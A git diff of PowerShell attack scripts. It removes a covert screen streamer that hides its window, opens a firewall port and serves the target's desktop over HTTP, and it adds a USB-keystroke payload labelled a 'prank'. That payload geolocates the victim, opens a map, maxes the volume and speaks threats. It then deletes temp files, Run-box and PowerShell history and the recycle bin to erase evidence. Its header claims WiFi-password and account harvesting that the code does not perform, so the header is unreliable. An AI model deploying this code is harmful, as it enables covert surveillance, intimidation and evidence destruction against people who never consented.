@@ -1,176 +1,177 @@
+############################################################################################################################################################                      
+#                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
+# Title        : We-Found-You      | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
+# Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
+# Version      : 1.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
+# Category     : Prank             | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
+# Target       : Windows 7,10,11   |                                                                   |___/ #           /\/|_      __/\\                  #     
+# Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #             
+#                                  |  My crime is that of curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
+#                                  |   and yea curiosity killed the cat                        ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                                                                                              
+#                                  |    but satisfaction brought him back                     (((^_(((/(((_/ #          /     \     /     \                #    
+#__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
+#  tiktok.com/@i_am_jakoby                                                                                   #         /       \   /     ~ \               #
+#  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
+#  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
+#  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
+#  youtube.com/c/IamJakoby                                                                                   #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
+############################################################################################################################################################
+
 <#
-================================================= Beigeworm's Screen Stream over HTTP ==========================================================
+.NOTES
+	The target's Location Services must be turned on or this payload will not work.
 
-SYNOPSIS
-Start up a HTTP server and stream the desktop to a browser window on another device on the network.
+.SYNOPSIS
+	This script will get the user's location and open a map of where they are in their browser and use Windows speech to declare you know where they are.  
 
-USAGE
-1. Run this script on target computer and note the URL provided
-2. on another device on the same network, enter the provided URL in a browser window
-3. Hold escape key on target for 5 seconds to exit screenshare.
-
+.DESCRIPTION 
+	This program gathers details from target PC to include Operating System, RAM Capacity, Public IP, and Email associated with their Microsoft account.
+	The SSID and WiFi password of any current or previously connected to networks.
+	It determines the last day they changed their password and how many days ago.
+	Once the information is gathered, the script will pause until a mouse movement is detected.
+	Then the script uses Sapi speak to roast their set up and lack of security.
 #>
 
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Hide the powershell console (1 = yes)
-$hide = 1
+<#
 
-[Console]::BackgroundColor = "Black"
-Clear-Host
-[Console]::SetWindowSize(88,30)
-[Console]::Title = "HTTP Screenshare"
-Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName PresentationCore,PresentationFramework
-Add-Type -AssemblyName System.Windows.Forms
-[System.Windows.Forms.Application]::EnableVisualStyles()
+.NOTES 
+	This is to get the name associated with the targets Microsoft account, if not detected UserName will be used. 
+#>
 
-# Define port number
-if ($port.length -lt 1){
-    Write-Host "Using default port.. (54387)" -ForegroundColor Green
-    $port = 54387
-}
+function Get-fullName {
 
-Write-Host "Detecting primary network interface." -ForegroundColor DarkGray
-$networkInterfaces = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.InterfaceDescription -notmatch 'Virtual' }
-$filteredInterfaces = $networkInterfaces | Where-Object { $_.Name -match 'Wi*' -or  $_.Name -match 'Eth*'}
-$primaryInterface = $filteredInterfaces | Select-Object -First 1
-if ($primaryInterface) {
-    if ($primaryInterface.Name -match 'Wi*') {
-        Write-Output "Wi-Fi is the primary internet connection."
-        $localIP = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Wi*" | Select-Object -ExpandProperty IPAddress
-    } elseif ($primaryInterface.Name -match 'Eth*') {
-        Write-Output "Ethernet is the primary internet connection."
-        $localIP = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Eth*" | Select-Object -ExpandProperty IPAddress
-    } else {
-        Write-Output "Unknown primary internet connection."
-    }
-    } else {Write-Output "No primary internet connection found."}
-
-New-NetFirewallRule -DisplayName "AllowWebServer" -Direction Inbound -Protocol TCP -LocalPort $port -Action Allow | Out-Null
-$webServer = New-Object System.Net.HttpListener 
-$webServer.Prefixes.Add("http://"+$localIP+":$port/")
-$webServer.Prefixes.Add("http://localhost:$port/")
-$webServer.Start()
-Write-Host ("Network Devices Can Reach the server at : http://"+$localIP+":$port") 
-Write-Host "Press escape key for 5 seconds to exit" -f Cyan
-Write-Host "Hiding this window.." -f Yellow
-sleep 4
-
-# Code to hide the console on Windows 10 and 11
-if ($hide -eq 1){
-    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
-    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
-    $hwnd = (Get-Process -PID $pid).MainWindowHandle
-    
-    if ($hwnd -ne [System.IntPtr]::Zero) {
-        $Type::ShowWindowAsync($hwnd, 0)
-    }
-    else {
-        $Host.UI.RawUI.WindowTitle = 'hideme'
-        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
-        $hwnd = $Proc.MainWindowHandle
-        $Type::ShowWindowAsync($hwnd, 0)
-    }
-}
-
-# Escape to exit key detection
-Add-Type @"
-using System;
-using System.Runtime.InteropServices;
-
-public class Keyboard
-{
-    [DllImport("user32.dll")]
-    public static extern short GetAsyncKeyState(int vKey);
-}
-"@
-$VK_ESCAPE = 0x1B
-$startTime = $null
-
-while ($true) {
     try {
-        $context = $webServer.GetContext()
-        $response = $context.Response
-        if ($context.Request.RawUrl -eq "/stream") {
-            $response.ContentType = "multipart/x-mixed-replace; boundary=frame"
-            $response.Headers.Add("Cache-Control", "no-cache")
-            $boundary = "--frame"
 
-            while ($context.Response.OutputStream.CanWrite) {
-                $screen = [System.Windows.Forms.Screen]::PrimaryScreen
-                $bitmap = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height
-                $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-                $graphics.CopyFromScreen($screen.Bounds.X, $screen.Bounds.Y, 0, 0, $screen.Bounds.Size)
+    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")
 
-                $stream = New-Object System.IO.MemoryStream
-                $bitmap.Save($stream, [System.Drawing.Imaging.ImageFormat]::Png)
-                $bitmap.Dispose()
-                $graphics.Dispose()
+    }
+ 
+ # If no name is detected function will return $env:UserName 
 
-                $bytes = $stream.ToArray()
-                $stream.Dispose()
+    # Write Error is just for troubleshooting 
+    catch {Write-Error "No name was detected" 
+    return $env:UserName
+    -ErrorAction SilentlyContinue
+    }
 
-                $writer = [System.Text.Encoding]::ASCII.GetBytes("$boundary`r`nContent-Type: image/png`r`nContent-Length: $($bytes.Length)`r`n`r`n")
-                $response.OutputStream.Write($writer, 0, $writer.Length)
-                $response.OutputStream.Write($bytes, 0, $bytes.Length)
-                $boundaryWriter = [System.Text.Encoding]::ASCII.GetBytes("`r`n")
-                $response.OutputStream.Write($boundaryWriter, 0, $boundaryWriter.Length)
+    return $fullName 
 
-                Start-Sleep -Milliseconds 33 
+}
 
-                # Check for the escape key press to exit
-                $isEscapePressed = [Keyboard]::GetAsyncKeyState($VK_ESCAPE) -lt 0
-                if ($isEscapePressed) {
-                    if (-not $startTime) {
-                        $startTime = Get-Date
-                    }
-                    $elapsedTime = (Get-Date) - $startTime
-                    if ($elapsedTime.TotalSeconds -ge 5) {
-                        (New-Object -ComObject Wscript.Shell).Popup("Screenshare Closed.",3,"Information",0x0)
-                        sleep 1
-                        exit
-                    }
-                } else {
-                    $startTime = $null
-                }
+$FN = Get-fullName
 
-            }
-        } else {
-            $response.ContentType = "text/html"
-            $html = @"
-            <!DOCTYPE html>
-            <html>
-            <head>
-                <title>Streaming Video</title>
-                <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <style>
-                body {
-                    background-color: black;
-                    margin: 0;
-                    display: flex;
-                    justify-content: center;
-                    align-items: center;
-                    height: 100vh;
-                }
-                img {
-                    width: 90vw;
-                    height: auto;
-                    max-width: 100%;
-                    max-height: 100%;
-                }
-            </style>
-            </head>
-            <body>
-                <img src='/stream' alt='Streaming Video' />
-            </body>
-            </html>
-"@
-            $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
-            $response.OutputStream.Write($buffer, 0, $buffer.Length)
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	This is to get the current Latitude and Longitude of your target
+#>
+
+function Get-GeoLocation{
+	try {
+	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
+	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
+	$GeoWatcher.Start() #Begin resolving current locaton
+
+	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
+		Start-Sleep -Milliseconds 100 #Wait for discovery.
+	}  
+
+	if ($GeoWatcher.Permission -eq 'Denied'){
+		Write-Error 'Access Denied for Location Information'
+	} else {
+		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevant results.
+		
+	}
+	}
+    # Write Error is just for troubleshooting
+    catch {Write-Error "No coordinates found" 
+    return "No Coordinates found"
+    -ErrorAction SilentlyContinue
+    } 
+
+}
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	This is to pause the script until a mouse movement is detected
+#>
+
+function Pause-Script{
+Add-Type -AssemblyName System.Windows.Forms
+$originalPOS = [System.Windows.Forms.Cursor]::Position.X
+$o=New-Object -ComObject WScript.Shell
+
+    while (1) {
+        $pauseTime = 3
+        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
+            break
         }
-        $response.Close()
-    } catch {
-        Write-Host "Error encountered: $_"
+        else {
+            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
+        }
     }
 }
-$webServer.Stop()
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+$GL = Get-GeoLocation
+
+$GL = $GL -split " "
+
+$Lat = $GL[0].Substring(11) -replace ".$"
+
+$Lon = $GL[1].Substring(10) -replace ".$"
+
+Pause-Script
+
+# Opens their browser with a map of their current location
+
+Start-Process "https://www.latlong.net/c/?lat=$Lat&long=$Lon"
+
+Start-Sleep -s 3
+
+# Sets Volume to max level
+
+$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}
+
+# Sets up speech module 
+
+$s=New-Object -ComObject SAPI.SpVoice
+$s.Rate = -2
+$s.Speak("We found you $FN")
+$s.Speak("We know where you are")
+$s.Speak("We are everywhere")
+$s.Speak("We do not forgive, we do not forget")
+$s.Speak("Expect us")
+
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	This is to clean up behind you and remove any evidence to prove you were there
+#>
+
+# Delete contents of Temp folder 
+
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+# Delete run box history
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Delete powershell history
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+# Deletes contents of recycle bin
+
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
